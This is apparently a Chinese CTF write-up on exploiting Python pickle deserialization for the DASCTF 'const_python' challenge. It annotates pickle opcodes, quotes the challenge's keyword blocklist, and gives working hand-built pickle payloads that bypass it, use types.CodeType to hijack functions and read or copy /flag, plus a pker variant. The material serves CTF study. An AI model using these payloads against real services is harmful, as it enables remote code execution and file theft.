b\u0026#39;\\x00\\x01\\x00\\x00\u0026#39;)[0]=\u0026gt;0x00001000=\u0026gt;256 # 5.struct.unpack解压\u0026lt;Q格式数据则是需要传入8字节大小数据,转换操作同上,例如unpack(\u0026#39;\u0026lt;Q\u0026#39;, b\u0026#39;\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39;)[0] =\u0026gt; 0x0000000000000100 =\u0026gt; 256 MARK = b\u0026#39;(\u0026#39; #向栈中压入一个Mark标记 STOP = b\u0026#39;.\u0026#39; #相当于停止当前的反序列化过程 POP = b\u0026#39;0\u0026#39; #从栈中pop出一个元素,就是删除栈顶元素 POP_MARK = b\u0026#39;1\u0026#39; #从栈中不断pop元素直到遇到Mark标记 DUP = b\u0026#39;2\u0026#39; #向栈中再压入一个当前的栈顶元素,就是复制一份当前栈顶元素然后进行压栈 FLOAT = b\u0026#39;F\u0026#39; #读取当前行到行末尾,然后转为float类型,向栈中压入一个float浮点数 INT = b\u0026#39;I\u0026#39; #向栈中压入一个int整数,整数就是当前行的最后一个字节,不过如果整数为01的时候压入的是True,为00的时候压入的是False BININT = b\u0026#39;J\u0026#39; #从后面的输入中读取4个字节并且使用unpack通过\u0026#39;\u0026lt;i\u0026#39;的格式将4字节的buffer数据解包转为int类型,后面不能换行,直接家下一步的操作b\u0026#34;(S\u0026#39;a\u0026#39;\\nK\\x01\\x01\\x01\\x01.\u0026#34; BININT1 = b\u0026#39;K\u0026#39; #和上面BININT一样,不过K操作只读取一个字节的数据b\u0026#34;(S\u0026#39;a\u0026#39;\\nK\\x01.\u0026#34; LONG = b\u0026#39;L\u0026#39; #读取当前行到行末尾,然后转为int类型,但如果后面是字符L的话会先去掉最后一个字符L再转int BININT2 = b\u0026#39;M\u0026#39; #从后面的输入中读取2个字节并且使用unpack通过\u0026#39;\u0026lt;H\u0026#39;的格式将2字节的buffer作为一个2进制数解包为int,后面不能换行,直接加下一步的操作b\u0026#34;(S\u0026#39;a\u0026#39;\\nM\\x01\\x01.\u0026#34; NONE = b\u0026#39;N\u0026#39; #向栈中压入一个None元素,后面不能换行,直接加下一步的操作b\u0026#34;(S\u0026#39;a\u0026#39;\\nN.\u0026#34; PERSID = b\u0026#39;P\u0026#39; #读取当前行到行末尾,将读取到的数据作为id,通过persistent_load函数获得obj对象返回后将obj对象压栈,默认情况没用,要重写persistent_load函数才能生效 BINPERSID = b\u0026#39;Q\u0026#39; #和上面作用一样,从当前栈中弹出一个元素作为id,通过persistent_load... REDUCE = b\u0026#39;R\u0026#39; #从当前栈中弹出两次元素,第一次是函数参数args,第二次是函数func,执行func(args) STRING = b\u0026#39;S\u0026#39; #向栈中压入一个string字符串,内容就是后面的数据,后面的字符串第一个和最后一个必须是单引号b\u0026#34;(S\u0026#39;a\u0026#39;\\nS\u0026#39;\u0026#39;a\u0026#39;\u0026#39;\\n.\u0026#34; BINSTRING = b\u0026#39;T\u0026#39; #从后面数据读取4字节数据,通过unpack使用\u0026lt;i格式将数据解压后变为int类型, 然后将其作为一个长度, 后面读取这个指定长度的数据作为字符串进行压栈b\u0026#34;(S\u0026#39;a\u0026#39;\\nT\\x10\\x00\\x00\\x000123456789abcdef.\u0026#34; # _struct.unpack(\u0026#39;\u0026lt;i\u0026#39;, b\u0026#34;\\x10\\x00\\x00\\x00\u0026#34;) =\u0026gt; (16,) SHORT_BINSTRING= b\u0026#39;U\u0026#39; #先读取一个字节数据作为长度,然后按照这个长度读取字符串,读出的字符串压栈 UNICODE = b\u0026#39;V\u0026#39; #读出当前行后面的全部数据,然后进行Unicode解码,将解码内容压栈b\u0026#39;V\\\\u0061\\n.\u0026#39; BINUNICODE = b\u0026#39;X\u0026#39; #读出4字节数据通过unpack使用\u0026lt;I格式解压,将解压得到的数据作为长度,然后进行数据读取b\u0026#39;X\\x10\\x00\\x00\\x00abcdef0123456789.\u0026#39; APPEND = b\u0026#39;a\u0026#39; #先pop出栈一个变量var1,然后获取当前栈顶元素var2,执行栈顶元素的append函数,就是将一开始的栈顶元素弹出,然后又加到下一个栈顶数组中b\u0026#34;]S\u0026#39;S1nKk\u0026#39;\\na.\u0026#34; =\u0026gt; 得到[\u0026#39;S1nKk\u0026#39;] BUILD = b\u0026#39;b\u0026#39; #这个操作就是设置元素属性的操作 # 先pop出栈一个变量var1,然后获取当前栈顶元素var2,获取var2的__setstate__子成员作为var3,如果var3非空,那就执行var3(var1),这个操作正常就是通过__setstate__设置变量的属性 # 但是上面的var3为空也有别的处理: # 1.检查var1是否为tuple类型且长度为2,如果是的话那就将其分别赋值为state,slotstate # 2.检查state是否为空,如果不为空尝试取出state.items()然后使用k,v键值对的方式便利,最后通过修改var2.__dict__的方式修改var2的属性,也就是使得var2[k]=v,var2.k=v # 3.检查slotstate是否为空,如果不为空和第2步一样,取出slotstate.items()通过k,v键值对方式遍历,然后使用setattr方法设置var2属性,最后效果也是var2[k]=v,var2.k=v GLOBAL = b\u0026#39;c\u0026#39; #导入一个模块,首先读取当前行后面的全部内容适应utf-8解码得到的字符串作为module,然后再读出下一行的内容同样解析出字符串作为那么,最后导入module.name这个包 DICT = b\u0026#39;d\u0026#39; #将栈中的数据弹出到上一个Mark为止,然后按照key:value的方式逐个解析然后放入到一个字典中,将最后得到的字典压栈b\u0026#34;(S\u0026#39;key1\u0026#39;\\nS\u0026#39;val1\u0026#39;\\nS\u0026#39;key2\u0026#39;\\nS\u0026#39;val2\u0026#39;\\nd.\u0026#34; =\u0026gt; {\u0026#39;key1\u0026#39;: \u0026#39;val1\u0026#39;, \u0026#39;key2\u0026#39;: \u0026#39;val2\u0026#39;} EMPTY_DICT = b\u0026#39;}\u0026#39; #没什么好说的,就是往栈中压入一个空字典 APPENDS = b\u0026#39;e\u0026#39; #先将栈中元素不断弹出知道Mark标记,然后将弹出的全部元素放入items中,再取出栈顶作为list_obj,之后执行下面两步操作: # 1.先取出extend=list_obj.extend,然后执行extend(items) # 2.取出append = list_obj.append,然后使用for循环遍历items得到item,然后每次循环都执行一次append(item) # 看到这里应该想到函数触发的方法,我们只需要使用b操作将list_obj的extend改为一个危险的函数方法,然后再让参数进入items,就可以通过extend(items)的方式调用任意构造的危险函数了 GET = b\u0026#39;g\u0026#39; #读取后面的全部本行数据,然后转为int类型放入变量i中,使用i作为索引,从缓存区取出数据mem[i],然后将这个从缓存中取出的变量压栈 BINGET = b\u0026#39;h\u0026#39; #后面读取一个字节的数据,然后使用字符16进制大小作为下标索引,从缓存mem中读数据,将读出的内容压栈,下面就是一个获取缓存中下标为1的数据的实例b\u0026#34;S\u0026#39;h0cksr\u0026#39;\\np1\\nS\u0026#39;t\u0026#39;\\n0h\\x01.\u0026#34; INST = b\u0026#39;i\u0026#39; #两次pop出栈读出数据并且均进行解码操作使其变为字符串格式, # 1. 第一第二次弹出的数据分别放入module和name中,先导入moudle模块,然后name通过.逐个获取出里面的子成员,最后返回目标子成员(可能是函数也可能是类或变量)var1 # 2. 继续进行出栈,直到遇到Mark标志,将出栈的数据作为参数,var1位方法,执行var1(Mark弹出数据) # 3. 将生成的实例化对象压栈 LONG_BINGET = b\u0026#39;j\u0026#39; #先读出4字节大小数据流,然后通过unpack使用\u0026lt;I格式解压得到int类型数据i,将i作为下标,从缓存中获取变量mem[i],将获取到的数据压栈 LIST = b\u0026#39;l\u0026#39; #将上一次Mark之后的数据全部弹出,并且将其存放到一个数组中,然后在将这个数组压栈b\u0026#34;(S\u0026#39;S1nKk\u0026#39;\\np1\\nS\u0026#39;t\u0026#39;\\nl.\u0026#34; EMPTY_LIST = b\u0026#39;]\u0026#39; #没什么好说,往栈中压入一个空数组 OBJ = b\u0026#39;o\u0026#39; #先是将上一次Mark之后的数据全部弹出,得到一个数组var1,然后又在var1中pop取出最后一个数据作为var2,之后执行以下过程: # 1.检查弹出数据后的var1数组是否为空,如果var1非空,或者弹出的var2属于type类型,或者弹出的var2有__getinitargs__属性成员,那么就会执行var2(var1) # 2.如果以上条件均不满足,那就执行var2.__new__(var2) # 3.将执行结果压入栈中 PUT = b\u0026#39;p\u0026#39; #读取后面全部当前行的数据,然后转为int类型的变量i,然后赋值当前栈顶元素存到memo[i]中 BINPUT = b\u0026#39;q\u0026#39; #和上一个一样,不同的是下标i是通过读取1个字节的数据,然后直接当做下标 LONG_BINPUT = b\u0026#39;r\u0026#39; #和上一个一样,不同的是下标i是通过读取4个字节的数据,然后通过unpack使用\u0026lt;I模式解压得到的整数当做下标 SETITEM = b\u0026#39;s\u0026#39; #先在栈中pop弹出第一个数据作为value,然后在pop弹出第二个元素作为key,再获取当前栈顶元素记为dict,给栈顶元素赋值dict[key]=value TUPLE = b\u0026#39;t\u0026#39; #弹出上一次Mark之后的全部数据大农一个list数组中,然后使用tuple函数将其转为元组格式再把这个元组压入栈中 EMPTY_TUPLE = b\u0026#39;)\u0026#39; #没什么好说,往栈中压入一个空元组 SETITEMS = b\u0026#39;u\u0026#39; #先弹出上一次Mark之后的全部元素放入一个数组items中,然后获取栈顶元素记为dict,通过i=0,2,3...获取items中的数据,执行dict[items[i]] = items[i + 1]给栈顶的字典元素添加键值对 BINFLOAT = b\u0026#39;G\u0026#39; #先读取8字节数据,然后使用unpack通过\u0026lt;d格式的解压,将得到的float数据压栈 TRUE = b\u0026#39;I01\\n\u0026#39; # not an opcode; see INT docs in pickletools.py FALSE = b\u0026#39;I00\\n\u0026#39; # not an opcode; see INT docs in pickletools.py # Protocol 2 PROTO = b\u0026#39;\\x80\u0026#39; #用于声明pickle协议版本 NEWOBJ = b\u0026#39;\\x81\u0026#39;#(这个很有用) #从栈中弹出两次变量,第一次弹出的变量记为var1,第二次弹出的变量记为var2,然后就会通过cls.__new__(var2, *var1)生成实例化对象,然后将生成的对象压栈 EXT1 = b\u0026#39;\\x82\u0026#39; #\u0026#39;\u0026#39;\u0026#39;\\x82,\\x83,\\x84这三个操作都是和extension registry扩展注册表有关的,但是拓展注册表主要维护4个从copyreg导入的映射字典 EXT2 = b\u0026#39;\\x83\u0026#39; # dispatch_tablecopyreg, _extension_registry, _inverted_registry, _extension_cache EXT4 = b\u0026#39;\\x84\u0026#39; # 但是从头到尾貌似这几个核心表单都没有发生过变化(也可能是我没注意到而已)\u0026#39;\u0026#39;\u0026#39; TUPLE1 = b\u0026#39;\\x85\u0026#39; #将栈顶元素弹出放到一个元组中再将这个元组压栈,就是将栈顶放到一个元组里面的作用b\u0026#34;S\u0026#39;S1nk\u0026#39;\\n\\x85.\u0026#34; =\u0026gt; (\u0026#39;S1nk\u0026#39;,) TUPLE2 = b\u0026#39;\\x86\u0026#39; #将栈顶的两个元素弹出,栈顶弹出为var1,继续弹出一个为var2,然后组成一个元组然后将这个元组压栈,得到(var2,var1),b\u0026#34;S\u0026#39;S1nk\u0026#39;\\nS\u0026#39;S1nKk\u0026#39;\\n\\x86.\u0026#34; =\u0026gt; (\u0026#39;S1nk\u0026#39;, \u0026#39;S1nKk\u0026#39;) TUPLE3 = b\u0026#39;\\x87\u0026#39; #和上面一样,不够该操作是弹出三个元素形成元组b\u0026#34;S\u0026#39;S1nK\u0026#39;\\nS\u0026#39;S11nK\u0026#39;\\nS\u0026#39;S111nK\u0026#39;\\n\\x87.\u0026#34; =\u0026gt; (\u0026#39;S1nK\u0026#39;, \u0026#39;S11nK\u0026#39;, \u0026#39;S111nk\u0026#39;) NEWTRUE = b\u0026#39;\\x88\u0026#39; #向栈中压入一个True NEWFALSE = b\u0026#39;\\x89\u0026#39; #向栈中压入一个False LONG1 = b\u0026#39;\\x8a\u0026#39; #先读取一个字节,以该字节16进制数为大小size,从后面的数据读取size个字节,然后将读取到的数据转为long类型 LONG4 = b\u0026#39;\\x8b\u0026#39; #读取4字节数据,通过unpack的\u0026lt;i格式将数据解压得到一个整数,以这个整数为字节大小读取后面的数据 _tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]#就是元组操作合集,分别是向栈中压入空数组,将最后1个元素放入元组后将元组压栈,将最后2个元素放入元组后将元组压栈,将最后3个元素放入元组后将元组压栈 # Protocol 3 (Python 3.x)#这里要注意一下,后面的操作是有python3方才支持 BINBYTES = b\u0026#39;B\u0026#39; #先读取4字节数据通过unpack使用\u0026lt;i格式将数据解压,将得到的结果作为大小向后读取相应字节数,然后将读取到的全部字节压栈,注意一下,压栈的是原始的比特流数据b\u0026#39;B\\x06\\x00\\x00\\x00h0cksr.\u0026#39; =\u0026gt; b\u0026#39;h0cksr\u0026#39; SHORT_BINBYTES = b\u0026#39;C\u0026#39; #读取一个字节,以它的16进制数作为大小向后读取对应字节的数据b\u0026#39;C\\x06h0cksr.\u0026#39; =\u0026gt; b\u0026#39;S1nKk\u0026#39; # Protocol 4 SHORT_BINUNICODE = b\u0026#39;\\x8c\u0026#39; #先读取一个字节,以这个字节的16进制为大小向后读取对应字节的数据,然后使用utf-8的格式解码数据为字符串格式,然后将这个字符串压栈b\u0026#39;\\x8c\\x06S1nKk.\u0026#39; =\u0026gt; S1nKk BINUNICODE8 = b\u0026#39;\\x8d\u0026#39; #先读取8字节数据然后通过unpack使用\u0026lt;Q格式解压数据,将得到的结果作为大小向后读取相应字节数,然后将读取到的数据使用utf-8格式解压为字符串,将字符串压栈b\u0026#39;\\x8d\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00h0cksr.\u0026#39; =\u0026gt; h0cksr BINBYTES8 = b\u0026#39;\\x8e\u0026#39; #同上读取8字节数据\u0026lt;Q格式解压,然后读取数据,但是直接将比特流数据压栈而不会解码b\u0026#39;\\x8e\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00S1nKk.\u0026#39; =\u0026gt; b\u0026#39;S1nKk\u0026#39; EMPTY_SET = b\u0026#39;\\x8f\u0026#39; #向栈中压入一个set类型的空集合(set()没有指定iterable的时候返回的是一个空集合) ADDITEMS = b\u0026#39;\\x90\u0026#39; #先pop弹出一个元素作为items,记栈顶元素为top,然后检查top是否为set类型,如果是的话就执行top.update(items),如果top不是set类型那就使用for遍历items,逐个执行top.add(item) FROZENSET = b\u0026#39;\\x91\u0026#39; #弹出栈顶元素作为items,然后执行frozenset(items)生成一个frozenset类型的变量,并将这个变量压栈 NEWOBJ_EX = b\u0026#39;\\x92\u0026#39;#(这个很有用) #和NEWOBJ差不多,先从栈中弹出三个元素,第一个,第二个,第三个弹出的元素分别记为var1,var2,var3,然后执行cls.__new__(var3, *var2, **var1)之后将执行生成的对象压栈 STACK_GLOBAL = b\u0026#39;\\x93\u0026#39;#(这个很有用) #和GLOBAL操作一样但是导入的模块从栈上获取,先弹出一个元素为name,然后再弹出一个元素moudle,要求两个元素都必须是字符串类型,然后到处moudle.name,在将导出的内容压栈b\u0026#34;S\u0026#39;os\u0026#39;\\nS\u0026#39;system\u0026#39;\\n\\x93.\u0026#34; =\u0026gt; os.system MEMOIZE = b\u0026#39;\\x94\u0026#39; #将当前栈顶元素添加到缓存列表的末尾(注意栈顶不会弹出) FRAME = b\u0026#39;\\x95\u0026#39; #后面先是读取8字节数据通过unpack使用\u0026lt;Q格式将数据解压得到的结果作为大小,向后读取对应字节的数据,然后将读取到的数据进行正常pickle反序列化(感觉用不用这个操作没啥差别,但是细节差别的话看源码) 好，正片开始\n小demo 看完上面现在是处于看得懂序列化数据的了\n然后看到参考文章中两个变量覆盖的demo，这个不止可以变量覆盖，可以用来我们验证手搓反序列化，后面会用到\nclass Student: def __init__(self, name, age): self.name = name self.age = age data=b\u0026#39;\u0026#39;\u0026#39;c__main__ Student (S\u0026#39;XiaoMing\u0026#39; S\u0026#34;20\u0026#34; tR.\u0026#39;\u0026#39;\u0026#39; a=pickle.loads(data) print(a.name,a.age) types.CodeType 这里也可以先看例题，然后回来看这里\n我们还需要知道这个知识点，这个函数是python用来动态修改函数，感觉利用点还不错有待开发利用，有点类似java agent后代理那种感觉\n这里可以先构造恶意函数，for出__code__对应的值，然后去覆盖我们目标函数，使其变成我们的恶意函数进行利用\ndef src(): return open(\u0026#34;app.py\u0026#34;, \u0026#34;r\u0026#34;,encoding=\u0026#34;utf-8\u0026#34;).read() for i in src.__code__.__dir__(): print(f\u0026#34;{i} : {getattr(src.__code__, i)}\u0026#34;) 看下面这个demo，将src的__code__覆盖给secret(),覆盖过程中做了个小修改，将src()中\u0026rsquo;app.py\u0026lsquo;改成\u0026rsquo;flag\u0026rsquo;（这里其实恶意函数可以写好，不用改的，这里懒得重新写demo了就直接用了hhh）,最后成功读取flag\nimport types def src(): return open(\u0026#34;app.py\u0026#34;, \u0026#34;r\u0026#34;,encoding=\u0026#34;utf-8\u0026#34;).read() def secret(): return oCode = src.__code__ secret.__code__= types.CodeType(oCode.co_argcount, oCode.co_posonlyargcount, oCode.co_kwonlyargcount, oCode.co_nlocals, oCode.co_stacksize, oCode.co_flags, oCode.co_code, tuple(c if c != \u0026#39;app.py\u0026#39; else \u0026#39;flag\u0026#39; for c in oCode.co_consts), oCode.co_names, oCode.co_varnames, oCode.co_filename, oCode.co_name, oCode.co_firstlineno, oCode.co_lnotab, oCode.co_freevars, oCode.co_cellvars,) print(secret()) 下面这个demo是为了pickle反序列化做铺垫的\npickle demo import builtins import types def src(): return open(\u0026#34;app.py\u0026#34;, \u0026#34;r\u0026#34;,encoding=\u0026#34;utf-8\u0026#34;).read() for i in src.__code__.__dir__(): print(f\u0026#34;{i} : {getattr(src.__code__, i)}\u0026#34;) g1 = builtins.getattr g2 = getattr(src,\u0026#34;__code__\u0026#34;) g3 = getattr(g2,\u0026#34;co_argcount\u0026#34;) g4 = getattr(g2,\u0026#34;co_posonlyargcount\u0026#34;) g5 = getattr(g2,\u0026#34;co_kwonlyargcount\u0026#34;) g6 = getattr(g2,\u0026#34;co_nlocals\u0026#34;) g7 = getattr(g2,\u0026#34;co_stacksize\u0026#34;) g8 = getattr(g2,\u0026#34;co_flags\u0026#34;) g9 = getattr(g2,\u0026#34;co_code\u0026#34;) g10 = (None, \u0026#39;flag\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;utf-8\u0026#39;, (\u0026#39;encoding\u0026#39;,))#g10 = getattr(g2,\u0026#34;co_consts\u0026#34;) g11 = getattr(g2,\u0026#34;co_names\u0026#34;) g12 = getattr(g2,\u0026#34;co_varnames\u0026#34;) g13 = getattr(g2,\u0026#34;co_filename\u0026#34;) g14 = getattr(g2,\u0026#34;co_name\u0026#34;) g15 = getattr(g2,\u0026#34;co_firstlineno\u0026#34;) g16 = getattr(g2,\u0026#34;co_lnotab\u0026#34;) g17 = getattr(g2,\u0026#34;co_freevars\u0026#34;) g18 = getattr(g2,\u0026#34;co_cellvars\u0026#34;) g19 = types.CodeType(g3,g4,g5,g6,g7,g8,g9,g10,g11,g12,g13,g14,g15,g16,g17,g18) g20 = builtins.setattr g20(src,\u0026#34;__code__\u0026#34;,g19) print(src()) 这里types.CodeType参数不能少就上面这些，然后构造的话其实可以直接myevil.__code__.__dir__()查看我们恶意函数就行，然后通过builtins.setattr进行赋值，有一点要注意参数赋值的顺序和__dir__()例出来的顺序有点不一样，要注意\n例题 const_python DASCTF2024最后一战｜寒夜破晓，冬至终章 官方WP\n我觉得这个题还是不错的，然后知道上面两个知识点就可以看这个题了,这里简短代码列出两个主要部分\n总得来说，就是有个pickle反序列化的接口但是有waf（尽管这个被绕了），然后我们可以通过pickle反序列化这个点来执行python代码调用types.CodeType动态修改函数，然后通过访问路由来调用我们的恶意函数\n@app.route(\u0026#39;/src\u0026#39;) def src(): return open(\u0026#34;app.py\u0026#34;, \u0026#34;r\u0026#34;,encoding=\u0026#34;utf-8\u0026#34;).read() @app.route(\u0026#39;/ppicklee\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def ppicklee(): data = request.form[\u0026#39;data\u0026#39;] sys.modules[\u0026#39;os\u0026#39;] = \u0026#34;not allowed\u0026#34; sys.modules[\u0026#39;sys\u0026#39;] = \u0026#34;not allowed\u0026#34; try: pickle_data = base64.b64decode(data) for i in {\u0026#34;os\u0026#34;, \u0026#34;system\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#39;setstate\u0026#39;, \u0026#34;globals\u0026#34;, \u0026#39;exec\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;template\u0026#39;, \u0026#39;render\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;compile\u0026#39;, \u0026#39;requests\u0026#39;, \u0026#39;exit\u0026#39;, \u0026#39;pickle\u0026#39;,\u0026#34;class\u0026#34;,\u0026#34;mro\u0026#34;,\u0026#34;flask\u0026#34;,\u0026#34;sys\u0026#34;,\u0026#34;base\u0026#34;,\u0026#34;init\u0026#34;,\u0026#34;config\u0026#34;,\u0026#34;session\u0026#34;}: if i.encode() in pickle_data: return i+\u0026#34; waf !!!!!!!\u0026#34; pickle.loads(pickle_data) return \u0026#34;success pickle\u0026#34; except Exception as e: return \u0026#34;fail pickle\u0026#34; 然后思路清晰了，就是构造poc\n调试demo 这里举个例子，用来看我们设置的临时变量对不对\nimport types import secrets import sys import builtins import pickle pickle_data=b\u0026#39;\u0026#39;\u0026#39;(NS\u0026#39;flag\u0026#39; S\u0026#39;r\u0026#39; S\u0026#39;utf-8\u0026#39; (S\u0026#39;encoding\u0026#39; ttp10 c__main__ s (S\u0026#39;name\u0026#39; g10 db.\u0026#39;\u0026#39;\u0026#39; class Secret: def __init__(self, name): self.name = name s=Secret((\u0026#34;sd\u0026#34;,)) pickle.loads(pickle_data) print(s.name) 然后这里我放一个官方wp的poc吧，不知道怎么来的，可以看上面pickle demo，这里就是通过pickle反序列化来调用函数，实现types.CodeType对src.__code__的修改，但是官方的poc很局限只是把src函数中app.py字符串修改为/flag\nop3 = b\u0026#39;\u0026#39;\u0026#39;cbuiltins getattr p0 c__main__ src p3 g0 (g3 S\u0026#39;__code__\u0026#39; tRp4 g0 (g4 S\u0026#39;co_argcount\u0026#39; tRp5 g0 (g4 S\u0026#39;co_argcount\u0026#39; tRp6 g0 (g4 S\u0026#39;co_kwonlyargcount\u0026#39; tRp7 g0 (g4 S\u0026#39;co_nlocals\u0026#39; tRp8 g0 (g4 S\u0026#39;co_stacksize\u0026#39; tRp9 g0 (g4 S\u0026#39;co_flags\u0026#39; tRp10 g0 (g4 S\u0026#39;co_code\u0026#39; tRp11 (NS\u0026#39;/flag\u0026#39; S\u0026#39;r\u0026#39; S\u0026#39;utf-8\u0026#39; (S\u0026#39;encoding\u0026#39; ttp12 g0 (g4 S\u0026#39;co_names\u0026#39; tRp13 g0 (g4 S\u0026#39;co_varnames\u0026#39; tRp14 g0 (g4 S\u0026#39;co_filename\u0026#39; tRp15 g0 (g4 S\u0026#39;co_name\u0026#39; tRp16 g0 (g4 S\u0026#39;co_firstlineno\u0026#39; tRp17 g0 (g4 S\u0026#39;co_lnotab\u0026#39; tRp18 g0 (g4 S\u0026#39;co_freevars\u0026#39; tRp19 g0 (g4 S\u0026#39;co_cellvars\u0026#39; tRp20 ctypes CodeType (g5 I0 g7 g8 g9 g10 g11 g12 g13 g14 g15 g16 g17 g18 g19 g20 tRp21 cbuiltins setattr (g3 S\u0026#34;__code__\u0026#34; g21 tR.\u0026#39;\u0026#39;\u0026#39; [*]实现接管任意函数 那我想达到什么效果呢，修改任意函数，任意函数代码，举个例子,这里secret函数相当于一个空函数，将他修改成和src一样的效果，或者说是修改成一个命令执行的函数\ndef src(): return open(\u0026#34;app.py\u0026#34;, \u0026#34;r\u0026#34;,encoding=\u0026#34;utf-8\u0026#34;).read() def secret(): return 其实用types.CodeType=\u0026gt;执行python代码很容易实现，但是这里我们要用pickle反序列化来实现这个效果，也就是要保证types.CodeType参数的赋值，这里获取src.__code__.__dir__()得到src函数的对应值。这里经过测试co_filename和co_name其实没啥影响，然后co_lnotab一般也就是下面的默认值。\nco_filename co_name co_lnotab 这几个值我们直接获取原函数的值就好\n然后最麻烦的问题就是co_code这个值，他是byte类型的，用V操作码uincode这种是不行的，V这种还是属于string跟byte其实不搭边\nco_argcount : 0 co_posonlyargcount : 0 co_kwonlyargcount : 0 co_nlocals : 0 co_stacksize : 5 co_flags : 67 co_code : b\u0026#39;t\\x00d\\x01d\\x02d\\x03d\\x04\\x8d\\x03\\xa0\\x01\\xa1\\x00S\\x00\u0026#39; co_consts : (None, \u0026#39;app.py\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;utf-8\u0026#39;, (\u0026#39;encoding\u0026#39;,)) co_names : (\u0026#39;open\u0026#39;, \u0026#39;read\u0026#39;) co_varnames : () co_freevars : () co_cellvars : () co_filename : c:/Users/jie/Desktop/4.py co_name : src co_firstlineno : 7 co_lnotab : b\u0026#39;\\x00\\x01\u0026#39; co_code 解决 然后我又再指令集里面翻呀翻，里面是看到跟byte有关的操作码，但其实都不能用（反正我没成功） 然后这种直接把值给到变量里这种我也试过，但是没啥用，显示的是C操作码，但是实现不了\nclass Secret: def __init__(self, name): self.name = name s=Secret(src.__code__.co_code) # s=Secret(\u0026#34;sfsd\u0026#34;) print(s.name) print(src.__code__.co_code) import pickletools dmup=pickle.dumps(s) print(dmup) pickletools.dis(dmup) # 38: \\x8c SHORT_BINUNICODE \u0026#39;name\u0026#39; # 44: \\x94 MEMOIZE (as 5) # 45: C SHORT_BINBYTES b\u0026#39;t\\x00d\\x01d\\x02d\\x03d\\x04\\x8d\\x03\\xa0\\x01\\xa1\\x00S\\x00\u0026#39; 这里我也看了下pker，但是其实它还不支持这种 解决byte传输 在我郁闷之际，又是参考文章救了我，我一眼看到pickle 0版本这不就是手搓的poc么，一个想法油然而生我看看pickle0咋赋值得呗\ns=Secret(src.__code__.co_code) dmup=pickle.dumps(s,protocol=0) print(dmup) # b\u0026#39;ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nSecret\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVname\\np6\\nc_codecs\\nencode\\np7\\n(Vt\\\\u0000d\\x01d\\x02d\\x03d\\x04\\x8d\\x03\\xa0\\x01\\xa1\\\\u0000S\\\\u0000\\np8\\nVlatin1\\np9\\ntp10\\nRp11\\nsb.\u0026#39; 格式化下\nccopy_reg _reconstructor p0 (c__main__ Secret p1 c__builtin__ object p2 Ntp3 Rp4 (dp5 Vname p6 c_codecs encode p7 (Vt\\\\u0000d\\x01d\\x02d\\x03d\\x04\\x8d\\x03\\xa0\\x01\\xa1\\\\u0000S\\\\u0000 p8 Vlatin1 p9 tp10 Rp11 sb. 我们注意到_codecs.encode，调用发现可以将我们uincode字符串转换成byte，这不就成了？\n实则不然，给我报了个这个错\npickletools.dis看是传入byte成功的，那为什么不行，然后用dis.dis()看了下改前和改后的两个函数有啥变化\n改前\n改后\n可以看到16这行后面确实不一样有问题，return都没有了，那只有可能是co_code值的问题。\n最后发现是_codecs.encode utf-8的问题，我们co_code中不符合utf-8编码规范的话会被转化，所以导致传入的不一样。 上网搜索得到latin-1编码（也叫 ISO-8859-1），我们用这个编码加密出来就没问题啦\nend poc 我们这里直接修改admin()方法\nimport types import secrets import sys import builtins import pickle def src(): return open(\u0026#34;app.py\u0026#34;, \u0026#34;r\u0026#34;,encoding=\u0026#34;utf-8\u0026#34;).read() def secret(): return p1= b\u0026#39;\u0026#39;\u0026#39;cbuiltins getattr p0 c__main__ admin p3 g0 (g3 S\u0026#39;__code__\u0026#39; tRp4 I0 p5 I0 p6 I0 p7 I0 p8 I5 p9 I67 p10 c_codecs encode p33 g33 (Vt\\x00d\\x01d\\x02d\\x03d\\x04\\x8d\\x03\\xa0\\x01\\xa1\\x00S\\x00 S\u0026#39;latin-1\u0026#39; tRp11 (NS\u0026#39;/flag\u0026#39; S\u0026#39;r\u0026#39; S\u0026#39;utf-8\u0026#39; (S\u0026#39;encoding\u0026#39; ttp12 (S\u0026#39;open\u0026#39; S\u0026#39;read\u0026#39; tp13 )p14 g0 (g4 S\u0026#39;co_filename\u0026#39; tRp15 g0 (g4 S\u0026#39;co_name\u0026#39; tRp16 I7 p17 g0 (g4 S\u0026#39;co_lnotab\u0026#39; tRp18 )p19 )p20 ctypes CodeType (g5 g6 g7 g8 g9 g10 g11 g12 g13 g14 g15 g16 g17 g18 g19 g20 tRp21 cbuiltins setattr (g3 S\u0026#34;__code__\u0026#34; g21 tR.\u0026#39;\u0026#39;\u0026#39; import base64 encrypted_p1 = base64.b64encode(p1) print(encrypted_p1) /ppicklee路由pickle反序列化，直接post访问/admin路由就成啦\n非预期 使用的pker，直接粘的别人poc（懒\n其实用的python的一个特性，就是当app.py运行时,修改app.py内容是可以成功，且不影响app.py之前代码正常运行，就是修改后，运行还是按照运行前的代码运行，尽管app.py内容变了。\n然后再访问/src就好了\ngetattr = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;getattr\u0026#39;) open = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;open\u0026#39;) flag=open(\u0026#39;/flag\u0026#39;) read=getattr(flag, \u0026#39;read\u0026#39;) f=open(\u0026#39;./app.py\u0026#39;,\u0026#39;w\u0026#39;) write=getattr(f, \u0026#39;write\u0026#39;) fff=read() write(fff) return pker 也是看文章了解到，看poc感觉也就是帮我们手搓，但是不是万能的\n下载\nhttps://github.com/eddieivan01/pker\n使用方法\nhttps://xz.aliyun.com/t/7012?time__1311=n4%2BxnD0Dy7it0QYuq05%2BbWNi%3DkqD5DOFDjOxTD#toc-9\n$ cat test/SUCTF2019_guess_game_1 Game = GLOBAL(\u0026#39;guess_game.Game\u0026#39;, \u0026#39;Game\u0026#39;) game = GLOBAL(\u0026#39;guess_game\u0026#39;, \u0026#39;game\u0026#39;) game.round_count = 10 game.win_count = 10 ticket = INST(\u0026#39;guess_game.Ticket\u0026#39;, \u0026#39;Ticket\u0026#39;, 6) return ticket $ python3 pker.py \u0026lt; 